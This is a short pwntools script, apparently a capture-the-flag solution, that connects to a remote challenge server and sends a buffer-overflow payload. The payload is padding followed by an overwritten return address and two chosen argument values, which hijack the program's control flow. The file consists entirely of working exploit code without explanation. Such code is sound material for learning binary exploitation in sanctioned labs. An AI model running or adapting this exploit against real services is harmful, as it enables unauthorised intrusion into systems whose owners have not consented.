from pwn import *

#io = process("./vuln")
ip, port = "159.65.19.4", 30388
io = remote(ip, port)

payload = (180+4+4)*'A'+p32(0x080491e2)+4*'A'+p32(0xdeadbeef)+p32(0xc0ded00d)
#print payload
io.recvuntil('You know who are 0xDiablos:')
io.sendline(payload)

print io.recvall()